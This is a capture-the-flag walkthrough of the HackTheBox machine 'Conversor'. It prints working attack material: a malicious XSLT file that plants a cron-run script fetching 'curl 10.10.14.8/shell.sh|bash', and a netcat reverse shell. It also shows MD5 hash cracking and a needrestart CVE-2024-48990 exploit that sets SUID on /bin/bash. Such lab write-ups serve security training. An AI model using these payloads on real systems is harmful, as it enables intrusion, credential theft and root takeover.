# **Conversor - HackTheBox**

*Target Ip. Address: 10.129.238.31*

Let's start with a nmap scan.

```bash
kali@kali:nmap -sV -sC 10.129.238.31
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 08:17 +0000
Nmap scan report for 10.129.238.31
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.16 seconds
```

So, only 2 ports. Port 22 (ssh) and Port 80 (http). Let's update /etc/hosts.

```bash
kali@kali:cat /etc/hosts
10.129.238.31   conversor.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

So, we have a login page. we can also register. Let's register and login with an account.

<img width="1288" height="941" alt="image" src="https://github.com/user-attachments/assets/bf48e54b-67f7-4b04-9b33-922357e8f9c8" />

We have a file uploads here and we can download the template also. Let's download and see it. 

We will keep that in mind. Let's explore.

<img width="1288" height="951" alt="image" src="https://github.com/user-attachments/assets/cd7c9a2a-06f4-4bc3-889f-f523a881fc12" />

We find source code and we can download it. Let's analyze it then.


```bash
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

We see there is a cronjob running executing any python script from "/var/www/conversor.htb/scripts/" directory. So, we have to find a way to write a python script on that location.

Looking at the main app.py, etree.parse(xslt_path) is used, which can be vulnerable. You can look here "*https://nvd.nist.gov/vuln/detail/CVE-2025-6985*".

So, we will create a malicious .xslt file, which will place our python script in the above directly and let the cronjob do the task.

```bash
kali@kali:cat exploit.xslt 
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
        xmlns:xsl="[http://www.w3.org/1999/XSL/Transform](http://www.w3.org/1999/XSL/Transform)"
        xmlns:shell="[http://exslt.org/common](http://exslt.org/common)"
    extension-element-prefixes="shell">
        <xsl:template match="/">
                <shell:document href="/var/www/conversor.htb/scripts/exploit.py" method="text">
import os
os.system("curl 10.10.14.8/shell.sh|bash")
        </shell:document>
        </xsl:template>
</xsl:stylesheet>

```

This payload will store our exploit.py on the directory, and we will get a callback on our machine, where we will keep a reverse shell payload.

```bash
kali@kali:cat shell.sh
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f
```

Now, start a python server and a listener.

```bash
kali@kali:python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.66 • 172.17.0.1 • 172.18.0.1 • 10.10.14.8
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

And upload the exploit payload we created, and let the cron job do the work.

```bash
kali@kali:python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.238.31 - - [18/Mar/2026 08:51:15] "GET /shell.sh HTTP/1.1" 200 -
```

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.66 • 172.17.0.1 • 172.18.0.1 • 10.10.14.8
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from conversor~10.129.238.31-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /home/kali/.penelope/sessions/conversor~10.129.238.31-Linux-x86_64/2026_03_18-08_51_18-513.log 📜
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@conversor:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We got a shell as www-data.

We had also noticed the database path before on app.py.

```bash
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
```

Let's head there.

```bash
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> select * from users;
1|fismathack|5b.....ec
5|hello|5d41402abc4b2a76b9719d911017c592
```

We find the user credentials. It is just a md5 hash, we can crack it from "*https://crackstation.net/*".

```bash
www-data@conversor:~$ su fismathack
Password: 
fismathack@conversor:/var/www$ 
```

We get our first flag.

```bash
fismathack@conversor:~$ cat user.txt
b8.....41
```

Let's see if we have any sudo permissions.

```bash
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

We can use /usr/sbin/needrestart.

Let's check the version of needrestart first.

```bash
fismathack@conversor:~$ needrestart --version

needrestart 3.7 - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.
```

The exploit can be found here "*https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing*".

But the machine doesn't have gcc, so we will have to compile it first on our machine.

```bash
kali@kali:cat exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void __attribute__ ((constructor)) init(void);

static void init(void) {
    setuid(0);
    setgid(0);
    system("chmod +s /bin/bash");
}
```

```bash
kali@kali:gcc -fPIC -shared -o exploit.so exploit.c
```

Bring that exploit to the machine, and let's change the script to make it suitable for us.

```bash
fismathack@conversor:~$ cat exploit.sh
#!/bin/bash
WORK_DIR="/tmp/malicious"
mkdir -p "$WORK_DIR/importlib"
cd "$WORK_DIR"

if [ -f "/home/fismathack/exploit.so" ]; then
    cp "/home/fismathack/exploit.so" "$WORK_DIR/importlib/__init__.so"
else
    echo "[-] exploit.so not found in /home/fismathack/"
    exit 1
fi

cat << 'EOF' > bait.py
import time
print("[+] Bait process started. Waiting for needrestart scan...")
while True:
    time.sleep(1)
EOF

echo "[*] Launching bait process with PYTHONPATH=$WORK_DIR"
PYTHONPATH="$WORK_DIR" python3 bait.py &
BAIT_PID=$!

echo "[!] SUCCESS: Bait is swimming (PID: $BAIT_PID)."
echo "[!] ACTION: Now run 'sudo /usr/sbin/needrestart' in this or another terminal."
echo "[!] After the scan, check if your exploit triggered (e.g., check /tmp/pwned or your shell)."
```

Run the exploit. Ignore the errors.

```bash
fismathack@conversor:~$ ./exploit.sh 
[*] Launching bait process with PYTHONPATH=/tmp/malicious
[!] SUCCESS: Bait is swimming (PID: 6355).
.
.
.
[+] Bait process started. Waiting for needrestart scan...
```

Now, login from another terminal and run the sudo command.

```bash
fismathack@conversor:~$ sudo /usr/sbin/needrestart
Scanning processes...
Scanning linux images...

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```

Check if the exploit worked.

```bash
fismathack@conversor:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

That was a success. Now, we can become root.

```bash
fismathack@conversor:~$ /bin/bash -p
bash-5.1# id
uid=1000(fismathack) gid=1000(fismathack) euid=0(root) egid=0(root) groups=0(root),1000(fismathack)
```

Let's read the final flag and end this challenge.

```bash
bash-5.1# cat root.txt
d1.....99
```
